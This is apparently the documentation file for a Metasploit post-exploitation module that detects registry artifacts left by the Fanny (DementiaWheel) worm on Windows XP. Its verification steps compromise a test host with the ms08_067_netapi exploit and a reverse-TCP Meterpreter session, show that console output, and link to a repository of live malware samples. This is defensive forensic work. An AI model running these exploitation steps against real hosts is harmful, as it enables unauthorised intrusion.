@@ -1,0 +1,126 @@
+## Fanny.bmp (DWE) Detection Module
+Fanny or DWE for short. (DWE = DementiaWheel)
+
+## Vulnerable Application
+Detection module based on the post-/gather/forensics module duqu_check.rb,
+
+Fanny is a worm that infects windows machines, via USB (not trough Autorun, or at least not only). It used exploits later found in StuxNet, and creates some Registry artifacts.
+This module is intended to detect those artifacts.
+
+POC https://user-images.githubusercontent.com/68499986/102911824-e2678280-447c-11eb-8495-7180a52c7266.png
+
+
+  #### supported Environments:
+    - [ ] Windows x86
+
+  ####  supported SessionTypes:
+    - [ ]  Meterpreter
+    - [ ]  Shell
+
+  #### supported OS's:
+    - [ ] Windows XP Pro (SP3)
+
+-------------------------
+
+
+## Verification Steps
+
+
+- [ ] First, Git clone the fanny_bmp_check.rb from https://github.com/loneicewolf/metasploit_fanny_check_module/blob/main/fanny_bmp_check.rb
+
+- [ ] place it into your msf folder, (important, check the following step before placing it) usually located in /root/.msf4/modules/
+
+- [ ] * make the following folders: (under each other) /post/windows/gather/forensics/ <fanny_bmp_check.rb here>
+
+- [ ] Start msfconsole
+
+- [ ] use exploit/windows/smb/ms08_067_netapi
+
+- [ ] set RHOST and LHOST.
+
+- [ ] msf6 exploit(windows/smb/ms08_067_netapi) > run
+
+        [*] Started reverse TCP handler on 192.168.122.1:4444 
+        [*] 192.168.122.160:445 - Automatically detecting the target...
+        [*] 192.168.122.160:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
+        [*] 192.168.122.160:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
+        [*] 192.168.122.160:445 - Attempting to trigger the vulnerability...
+        [*] Sending stage (175174 bytes) to 192.168.122.160
+        [*] Meterpreter session 4 opened (192.168.122.1:4444 -> 192.168.122.160:1043) at 2020-12-22 16:55:02 +0100
+
+meterpreter > run post/windows/gather/forensics/fanny_bmp_check 
+
+        [*] Searching registry on WORKSTATION1 for Fanny.bmp artifacts.
+        [+] WORKSTATION1: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\MediaResources\acm\ECELP4\Driver found in registry.
+        [+] WORKSTATION1: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\MediaResources\acm\ECELP4\filter2 found in registry.
+        [+] WORKSTATION1: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\MediaResources\acm\ECELP4\filter3 found in registry.
+        [+] WORKSTATION1: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\MediaResources\acm\ECELP4\filter8 found in registry.
+        [*] WORKSTATION1: 4 result(s) found in registry.
+
+-------------------------
+
+## Options
+List each option and how to use it.
+Session is needed, Do not know really what to include here, other than that.
+
+  < Intentionally left blank >
+
+-------------------------
+
+
+### Option Name
+
+Talk about what it does, and how to use it appropriately. If the default value is likely to change, include the default value here.
+
+  < Intentionally left blank >
+
+-------------------------
+
+
+## Scenarios
+Specific #demo
+
+I Will upload a POC video demonstrating this on Windows 10, x64. Sooner or later.
+There's already a XP POC video located here 
+ - https://github.com/loneicewolf/fanny.bmp/blob/main/FannyMalware%20POC%20.mp4
+
+"Equation Group Q&A PDF File" - Explaining (not only) Fanny, (but also many others, in the "same family" of malware)
+ 
+ - https://github.com/loneicewolf/fanny.bmp/blob/main/Equation_group_questions_and_answers.pdf
+
+If needed, I included malware samples on the same page.
+ 
+ **It goes without saying that if you proceed to this page Please exercise caution.**
+ 
+ - https://github.com/loneicewolf/fanny.bmp
+
+
+## References
+
+- [ ] https://securelist.com/a-fanny-equation-i-am-your-father-stuxnet/68787
+- [ ] https://fmnagisa.wordpress.com/2020/08/27/revisiting-equationgroups-fanny-worm-or-dementiawheel/
+- [ ] https://edwardsnowden.com/wp-content/uploads/2017/06/FOXACID-Server-SOP-Redacted.pdf
+
+
+### Optional reading
+
+- [ ] https://github.com/loneicewolf/fanny.bmp/blob/main/2004.06195.pdf
+
+-------------------------
+
+
+## Version and OS
+
+### Tested on
+
+  - [ ] Windows XP Pro SP3 English
+
+
+-------------------------
+
+
+## Contact info
+
+Any questions or Improvements / Issues is welcomed either via mail or at the issues tab/page.
+
+william-martens@protonmail.ch
